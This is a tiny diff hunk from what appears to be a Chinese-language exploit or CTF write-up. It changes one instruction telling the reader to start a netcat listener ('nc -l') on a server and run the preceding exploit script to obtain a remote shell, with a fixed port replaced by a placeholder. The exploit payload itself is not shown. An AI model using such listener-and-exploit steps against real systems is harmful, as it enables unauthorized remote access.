@@ -460,5 +460,5 @@ fin = payload + payload2
 io.sendline(fin)
 ```
 
-在服务器上``nc -l 6611``，然后跑这个脚本，就能get shell
+在服务器上``nc -l 端口号``，然后跑这个脚本，就能get shell
 
